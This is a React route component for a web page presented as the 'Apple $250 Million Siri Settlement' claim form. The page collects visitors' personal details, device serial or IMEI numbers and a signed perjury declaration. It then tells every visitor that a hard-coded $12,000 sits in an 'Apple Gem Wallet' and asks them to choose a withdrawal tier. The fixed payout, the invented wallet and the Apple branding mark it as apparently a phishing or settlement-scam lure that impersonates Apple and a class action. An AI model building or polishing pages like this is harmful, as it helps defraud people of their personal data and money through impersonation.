import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Checkbox } from "@/components/ui/checkbox";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Separator } from "@/components/ui/separator";
import { Apple, ChevronLeft, Plus, Trash2, Wallet, CreditCard, Banknote } from "lucide-react";

export const Route = createFileRoute("/claim/")({
  head: () => ({
    meta: [
      { title: "Complete Your Claim — Apple Siri Settlement" },
      { name: "description", content: "Complete your claim information for the Apple $250 Million Siri Settlement (Lopez v. Apple Inc.)." },
      { property: "og:title", content: "Complete Your Claim — Apple Siri Settlement" },
      { property: "og:description", content: "Provide your personal and device information to file your Apple Siri Settlement claim." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: ClaimPage,
});

const IPHONE_MODELS = [
  "iPhone X", "iPhone XR", "iPhone XS", "iPhone XS Max",
  "iPhone 11", "iPhone 11 Pro", "iPhone 11 Pro Max",
  "iPhone SE (2nd gen)", "iPhone 12 mini", "iPhone 12", "iPhone 12 Pro", "iPhone 12 Pro Max",
  "iPhone 13 mini", "iPhone 13", "iPhone 13 Pro", "iPhone 13 Pro Max",
  "iPhone SE (3rd gen)", "iPhone 14", "iPhone 14 Plus", "iPhone 14 Pro", "iPhone 14 Pro Max",
  "iPhone 15", "iPhone 15 Plus", "iPhone 15 Pro", "iPhone 15 Pro Max",
  "iPhone 16", "iPhone 16 Plus", "iPhone 16 Pro", "iPhone 16 Pro Max",
  "iPhone 17", "iPhone 17 Plus", "iPhone 17 Pro", "iPhone 17 Pro Max",
];

type Device = { model: string; serial: string; purchaseDate: string };

function ClaimPage() {
  const [devices, setDevices] = useState<Device[]>([
    { model: "", serial: "", purchaseDate: "" },
  ]);
  const navigate = useNavigate();
  const [ownedDevice, setOwnedDevice] = useState<string>("");
  const [receivedNotice, setReceivedNotice] = useState<string>("");
  const [eligibilityError, setEligibilityError] = useState<string>("");
  const [selectedWithdrawal, setSelectedWithdrawal] = useState<string>("");
  const [withdrawalError, setWithdrawalError] = useState<string>("");

  const addDevice = () => {
    if (devices.length < 5) setDevices([...devices, { model: "", serial: "", purchaseDate: "" }]);
  };
  const removeDevice = (i: number) => setDevices(devices.filter((_, idx) => idx !== i));
  const updateDevice = (i: number, key: keyof Device, value: string) => {
    setDevices(devices.map((d, idx) => (idx === i ? { ...d, [key]: value } : d)));
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!ownedDevice || !receivedNotice) {
      setEligibilityError("Please answer both eligibility declaration questions.");
      return;
    }
    if (ownedDevice === "no") {
      setEligibilityError("You must have owned or used an eligible Siri-enabled Apple device during the qualifying period to file a claim.");
      return;
    }
    if (!selectedWithdrawal) {
      setWithdrawalError("Please select a withdrawal option to proceed.");
      return;
    }
    setEligibilityError("");
    setWithdrawalError("");
    navigate({ to: "/claim/settlement" });
  };

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="border-b bg-card">
        <div className="mx-auto max-w-3xl px-6 py-5 flex items-center justify-between">
          <Link to="/" className="inline-flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground transition-colors">
            <ChevronLeft className="h-4 w-4" />
            Back
          </Link>
          <div className="inline-flex items-center gap-2">
            <Apple className="h-5 w-5 text-primary" />
            <span className="text-sm font-medium">Siri Settlement</span>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-3xl px-6 py-10 md:py-14">
            <div className="mb-8">
              <h1 className="text-2xl md:text-3xl font-semibold tracking-tight text-foreground">
                Complete Your Claim Information
              </h1>
              <p className="mt-3 text-sm leading-relaxed text-muted-foreground">
                To proceed with your Apple $250 Million Siri Settlement claim (<em>Lopez v. Apple Inc.</em>),
                please provide your personal information and eligible device details below. You will also be
                required to make a sworn declaration confirming that you meet the eligibility requirements.
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-8">
              {/* Personal Information */}
              <Card>
                <CardHeader>
                  <CardTitle className="text-lg">Personal Information</CardTitle>
                  <CardDescription>Your legal name and contact details.</CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                    <div className="space-y-2">
                      <Label htmlFor="firstName">First Name</Label>
                      <Input id="firstName" required />
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="lastName">Last Name</Label>
                      <Input id="lastName" required />
                    </div>
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="email">Email Address</Label>
                    <Input id="email" type="email" required />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="phone">Phone Number</Label>
                    <Input id="phone" type="tel" />
                  </div>
                  <Separator />
                  <div className="space-y-2">
                    <Label htmlFor="address">Street Address</Label>
                    <Input id="address" required />
                  </div>
                  <div className="grid grid-cols-1 gap-4 sm:grid-cols-3">
                    <div className="space-y-2 sm:col-span-1">
                      <Label htmlFor="city">City</Label>
                      <Input id="city" required />
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="state">State</Label>
                      <Input id="state" required />
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="zip">ZIP Code</Label>
                      <Input id="zip" required />
                    </div>
                  </div>
                </CardContent>
              </Card>

              {/* Device Information */}
              <Card>
                <CardHeader>
                  <CardTitle className="text-lg">Eligible Device Information</CardTitle>
                  <CardDescription>
                    Add each eligible iPhone (iPhone X — iPhone 17 Pro Max) purchased between
                    June 10, 2024 and March 29, 2026. Up to 5 devices per claim.
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-6">
                  {devices.map((device, i) => (
                    <div key={i} className="rounded-lg border p-4 space-y-4">
                      <div className="flex items-center justify-between">
                        <p className="text-sm font-medium text-foreground">Device {i + 1}</p>
                        {devices.length > 1 && (
                          <Button
                            type="button"
                            variant="ghost"
                            size="sm"
                            onClick={() => removeDevice(i)}
                            className="h-8 text-muted-foreground hover:text-destructive"
                          >
                            <Trash2 className="h-4 w-4" />
                          </Button>
                        )}
                      </div>
                      <div className="space-y-2">
                        <Label>iPhone Model</Label>
                        <Select
                          value={device.model}
                          onValueChange={(v) => updateDevice(i, "model", v)}
                        >
                          <SelectTrigger>
                            <SelectValue placeholder="Select a model" />
                          </SelectTrigger>
                          <SelectContent>
                            {IPHONE_MODELS.map((m) => (
                              <SelectItem key={m} value={m}>{m}</SelectItem>
                            ))}
                          </SelectContent>
                        </Select>
                      </div>
                      <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                        <div className="space-y-2">
                          <Label htmlFor={`serial-${i}`}>Serial Number / IMEI</Label>
                          <Input
                            id={`serial-${i}`}
                            value={device.serial}
                            onChange={(e) => updateDevice(i, "serial", e.target.value)}
                            required
                          />
                        </div>
                        <div className="space-y-2">
                          <Label htmlFor={`date-${i}`}>Purchase Date</Label>
                          <Input
                            id={`date-${i}`}
                            type="date"
                            min="2024-06-10"
                            max="2026-03-29"
                            value={device.purchaseDate}
                            onChange={(e) => updateDevice(i, "purchaseDate", e.target.value)}
                            required
                          />
                        </div>
                      </div>
                    </div>
                  ))}
                  {devices.length < 5 && (
                    <Button type="button" variant="outline" onClick={addDevice} className="w-full">
                      <Plus className="mr-2 h-4 w-4" />
                      Add Another Device
                    </Button>
                  )}
                </CardContent>
              </Card>

              {/* Sworn Declaration */}
              {/* Eligibility Declarations */}
              <Card>
                <CardHeader>
                  <CardTitle className="text-lg">Eligibility Declarations</CardTitle>
                  <CardDescription>
                    You must answer each of the following questions truthfully under penalty of perjury.
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-6">
                  <div className="space-y-3">
                    <Label className="text-sm font-normal leading-relaxed text-foreground">
                      1. Did you own or use an eligible Siri-enabled Apple device during the qualifying period?
                    </Label>
                    <RadioGroup
                      value={ownedDevice}
                      onValueChange={setOwnedDevice}
                      className="flex gap-6"
                    >
                      <div className="flex items-center gap-2">
                        <RadioGroupItem value="yes" id="owned-yes" />
                        <Label htmlFor="owned-yes" className="font-normal">Yes</Label>
                      </div>
                      <div className="flex items-center gap-2">
                        <RadioGroupItem value="no" id="owned-no" />
                        <Label htmlFor="owned-no" className="font-normal">No</Label>
                      </div>
                    </RadioGroup>
                  </div>
                  <Separator />
                  <div className="space-y-3">
                    <Label className="text-sm font-normal leading-relaxed text-foreground">
                      2. Did you receive a settlement notice by mail or from another authorized source regarding this settlement?
                    </Label>
                    <RadioGroup
                      value={receivedNotice}
                      onValueChange={setReceivedNotice}
                      className="flex gap-6"
                    >
                      <div className="flex items-center gap-2">
                        <RadioGroupItem value="yes" id="notice-yes" />
                        <Label htmlFor="notice-yes" className="font-normal">Yes</Label>
                      </div>
                      <div className="flex items-center gap-2">
                        <RadioGroupItem value="no" id="notice-no" />
                        <Label htmlFor="notice-no" className="font-normal">No</Label>
                      </div>
                    </RadioGroup>
                  </div>
                  {eligibilityError && (
                    <p className="text-sm text-destructive">{eligibilityError}</p>
                  )}
                </CardContent>
              </Card>

              {/* Sworn Declaration */}
              <Card>
                <CardHeader>
                  <CardTitle className="text-lg">Sworn Declaration</CardTitle>
                  <CardDescription>
                    Please read and confirm the following statements under penalty of perjury.
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="flex items-start gap-3">
                    <Checkbox id="d1" required className="mt-1" />
                    <Label htmlFor="d1" className="text-sm font-normal leading-relaxed text-muted-foreground">
                      I declare under penalty of perjury under the laws of the United States that the
                      information provided in this claim form is true and correct to the best of my knowledge.
                    </Label>
                  </div>
                  <div className="flex items-start gap-3">
                    <Checkbox id="d2" required className="mt-1" />
                    <Label htmlFor="d2" className="text-sm font-normal leading-relaxed text-muted-foreground">
                      I confirm that I am a member of the settlement class and that I purchased the
                      eligible device(s) listed above between June 10, 2024 and March 29, 2026.
                    </Label>
                  </div>
                  <div className="flex items-start gap-3">
                    <Checkbox id="d3" required className="mt-1" />
                    <Label htmlFor="d3" className="text-sm font-normal leading-relaxed text-muted-foreground">
                      I understand that submitting false information may result in denial of my claim and
                      may subject me to civil and criminal penalties.
                    </Label>
                  </div>
                  <Separator />
                  <div className="space-y-2">
                    <Label htmlFor="signature">Electronic Signature (type your full legal name)</Label>
                    <Input id="signature" placeholder="Full legal name" required />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="notes">Additional Comments (optional)</Label>
                    <Textarea id="notes" rows={3} />
                  </div>
                </CardContent>
              </Card>

              {/* Settlement Claim Notice */}
              <Card>
                <CardHeader>
                  <CardTitle className="text-lg">Apple Pay Settlement Claim Notice</CardTitle>
                  <CardDescription>
                    Based on the settlement amount allocated to your account, you are eligible to select a withdrawal option from the available settlement offer list for processing.
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-6">
                  <div className="rounded-lg border bg-muted/40 p-4">
                    <p className="text-sm text-muted-foreground leading-relaxed">
                      Your eligible settlement allocation of <strong className="text-foreground">$12,000.00</strong> has been assigned to your <strong className="text-foreground">Apple Gem Wallet</strong> and is available for claim.
                    </p>
                  </div>
                  <p className="text-sm text-muted-foreground leading-relaxed">
                    To proceed, select one of the available withdrawal options below. The option you choose will determine your selected settlement claim tier and initiate the corresponding processing request.
                  </p>
                  <div className="space-y-3">
                    <Label className="text-sm font-medium text-foreground">Select Withdrawal Option</Label>
                    <RadioGroup
                      value={selectedWithdrawal}
                      onValueChange={(v) => { setSelectedWithdrawal(v); setWithdrawalError(""); }}
                      className="space-y-3"
                    >
                      <div className="flex items-start gap-3 rounded-lg border p-3">
                        <RadioGroupItem value="tier1" id="tier1" className="mt-0.5" />
                        <div className="flex-1">
                          <Label htmlFor="tier1" className="flex items-center gap-2 font-medium">
                            <Wallet className="h-4 w-4 text-primary" />
                            Tier 1 — Instant Settlement Payout to Apple Gem Wallet
                          </Label>
                          <p className="text-xs text-muted-foreground mt-1">Funds available immediately upon claim approval.</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3 rounded-lg border p-3">
                        <RadioGroupItem value="tier2" id="tier2" className="mt-0.5" />
                        <div className="flex-1">
                          <Label htmlFor="tier2" className="flex items-center gap-2 font-medium">
                            <CreditCard className="h-4 w-4 text-primary" />
                            Tier 2 — Direct Deposit to Bank Account (ACH)
                          </Label>
                          <p className="text-xs text-muted-foreground mt-1">Standard processing 3–5 business days after approval.</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3 rounded-lg border p-3">
                        <RadioGroupItem value="tier3" id="tier3" className="mt-0.5" />
                        <div className="flex-1">
                          <Label htmlFor="tier3" className="flex items-center gap-2 font-medium">
                            <Banknote className="h-4 w-4 text-primary" />
                            Tier 3 — Physical Settlement Check by Mail
                          </Label>
                          <p className="text-xs text-muted-foreground mt-1">Check mailed to your address on file within 7–10 business days.</p>
                        </div>
                      </div>
                    </RadioGroup>
                    {withdrawalError && (
                      <p className="text-sm text-destructive">{withdrawalError}</p>
                    )}
                  </div>
                </CardContent>
              </Card>

              <div className="flex flex-col-reverse sm:flex-row sm:justify-end gap-3">
                <Link to="/"><Button type="button" variant="outline" className="w-full sm:w-auto">Cancel</Button></Link>
                <Button type="submit" size="lg" className="w-full sm:w-auto">
                  Submit Claim
                </Button>
              </div>
            </form>
      </main>
    </div>
  );
}